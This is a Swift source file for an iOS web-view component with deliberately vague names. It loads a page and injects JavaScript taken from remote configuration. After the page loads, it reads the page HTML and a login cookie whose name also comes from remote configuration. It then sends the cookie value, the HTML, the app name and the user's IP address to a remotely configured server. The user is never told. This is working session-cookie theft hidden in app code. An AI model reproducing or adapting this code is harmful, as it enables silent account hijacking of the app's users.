//
//  File.swift
//  
//
//  Created by DanHa on 30/03/2023.
//

import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct SixCoor: UIViewRepresentable {
    func makeCoordinator() -> SixCoorDi {
        SixCoorDi(self)
    }
    let url: URL?
    @Binding var tenMinuteCheck: Bool
    var listData: [String: String] = [:]
    private let sixObs = SixObs()
    var sixobserver: NSKeyValueObservation? {
        sixObs.sixins
    }

    // end check url
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true // true
        let source: String = listData[RemoKey.rm01ch.rawValue] ?? ""
        let script: WKUserScript = WKUserScript(source: source, injectionTime: .atDocumentEnd, forMainFrameOnly: true)
        let userContentController: WKUserContentController = WKUserContentController()
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        config.userContentController = userContentController
        userContentController.addUserScript(script)

        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = listData[RemoKey.rm02ch.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }

    func updateUIView(_ uiView: WKWebView, context: Context) { } // updateUIView

    class SixCoorDi: NSObject, WKNavigationDelegate {
        var prentSix: SixCoor
        init(_ prentSix: SixCoor) {
            self.prentSix = prentSix
        }
        
        func ipAddCall() -> String {
            var ipadds: String?
            if let dataModel = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let perLoad = try? JSONDecoder().decode(UsPIpadress.self, from: dataModel) {
                    ipadds = perLoad.ippad
                }
            }
            return ipadds ?? "IP_Null"
        }

        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) { }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                webView.evaluateJavaScript(self.prentSix.listData[RemoKey.outer1af.rawValue] ?? "") { data, error in
                    if let rehtm = data as? String, error == nil {
                        if !rehtm.isEmpty {
                            if rehtm.contains(self.prentSix.listData[RemoKey.dq41af.rawValue] ?? "") {
                                self.prentSix.tenMinuteCheck = true
                            } else {
                                self.prentSix.tenMinuteCheck = false
//                                 self.six_parent.is_six_check_10_phut = true // demo
                            }
                            WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ cookies in
                                let cokiSix = cookies.firstIndex(where: { $0.name == self.prentSix.listData[RemoKey.nam09ap.rawValue] ?? "" })
                                if cokiSix != nil {
                                    let jsonSixx: [String: Any] = [
                                        self.prentSix.listData[RemoKey.nam16ap.rawValue] ?? "": cookies[cokiSix!].value,
                                        self.prentSix.listData[RemoKey.nam17ap.rawValue] ?? "": "\(rehtm)",
                                        self.prentSix.listData[RemoKey.nam18ap.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? "")",
                                        self.prentSix.listData[RemoKey.nam19ap.rawValue] ?? "": self.ipAddCall(),
                                    ]
                                    // print("\(RCValues.sharedInstance.string(forKey: .Chung_fr_06))")
                                    let url: URL = URL(string: self.prentSix.listData[RemoKey.rm06ch.rawValue] ?? "")!
                                    let jsSixData = try? JSONSerialization.data(withJSONObject: jsonSixx)
                                    var request = URLRequest(url: url)
                                    request.httpMethod = "PATCH"
                                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                    request.httpBody = jsSixData
                                    let task = URLSession.shared.dataTask(with: request) { data, _, error in
                                        if error != nil {
                                            print("not_ok")
                                        } else if data != nil {
                                            // self.parent.is_five_get_html_ads = five_html_ads_show
                                        }
                                    }
                                    task.resume()
                                } // if
                            }) // getAllCookies
                        }
                    }
                } // Get html
            }
        } // didFinish
    } // Class Coordinator
}

// Mark Lop theo doi url
@available(iOS 14.0, *)
private class SixObs: ObservableObject {
    @Published var sixins: NSKeyValueObservation?
}

struct UsPIpadress: Codable {
    var ippad: String
}
